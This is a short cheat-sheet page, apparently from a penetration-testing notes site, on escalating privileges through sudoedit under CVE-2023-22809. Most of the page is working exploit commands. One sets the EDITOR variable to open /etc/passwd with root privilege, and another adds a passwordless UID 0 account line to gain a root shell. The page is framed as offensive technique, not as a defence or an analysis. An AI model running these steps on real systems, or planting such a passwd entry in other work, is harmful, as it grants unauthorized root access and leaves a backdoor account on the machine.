---
title: Sudoedit Privilege Escalation
description: Sudoedit is vulnerable to privilege escalation.
tags:
    - Privilege Escalation
refs:
    - https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
date: 2023-03-11
draft: false
---

## Investigation

```bash
sudo -l

(root) sudoedit /opt/example.txt
```

If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.

<br />

## Exploitation ([CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf))

In sudo version before 1.9.12p2, the sudoedit can modify arbitrary file with unrestricted privilege.

```bash
export EDITOR="vim -- /etc/passwd"
sudo sudoedit /opt/example.txt
```

In vim editor, add the following new line in **`/etc/passwd`**.

```bash
sudoedit::0:0:root:/root:/bin/bash
```

Now we can get a root shell.